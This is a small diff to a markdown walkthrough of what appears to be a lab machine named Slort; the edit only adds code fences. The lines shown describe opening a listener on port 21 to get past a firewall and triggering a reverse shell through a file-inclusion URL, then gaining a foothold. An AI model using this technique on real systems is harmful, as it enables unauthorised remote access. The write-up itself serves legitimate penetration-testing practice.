@@ -147,9 +147,9 @@ I started a listener on port 21 to avoid firewall restrictions
 listening on [any] 21 ...
 ~~~
 I then ran the reverse shell payload
-
+~~~shell
 http://192.168.182.53:4443/site/index.php?page=shell.php
-
+~~~
 And I recieved my initial foothold!
 ~~~shell
 ┌──(kali㉿kali)-[~/Desktop/Slort]
